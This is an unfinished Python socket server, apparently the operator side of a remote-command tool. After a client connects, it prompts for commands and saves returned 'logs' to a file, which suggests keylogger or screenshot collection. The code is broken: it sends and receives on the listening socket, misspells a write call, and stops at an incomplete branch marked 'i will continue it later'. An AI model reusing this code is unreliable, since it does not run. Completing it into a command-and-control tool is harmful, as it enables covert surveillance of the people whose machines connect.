import socket
import threading
from PIL import Image

HEADER = 64
PORT = 5050
SERVER = "#use your own ip"
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)



def handle_client(conn, addr):
    print(f"[NEW CONNECTION] {addr} connected.")

    connected = True
    while connected:
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT)
            if msg == DISCONNECT_MESSAGE:
                connected = False

            print(f"[{addr}] {msg}")
            conn.send("Msg received".encode(FORMAT))

    conn.close()


def start():
    server.listen()
    print(f"[LISTENING] Server is listening on {SERVER}")
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()
        print(f"[ACTIVE CONNECTIONS] {threading.activeCount() - 1}")
        a = input("type your command: ")

        server.send(a)
        if server.recv(999).decode("utf-8")=="sending log......":
            b =server.recv(999).decode("utf-8")
            f = open("log_hist.txt","w+")
            f.writ(b)

        elif type(server.recv(HEADER).decode("utf-8"))=='numpy.ndarray':
#i will continue it later


print("[STARTING] server is starting...")
start()
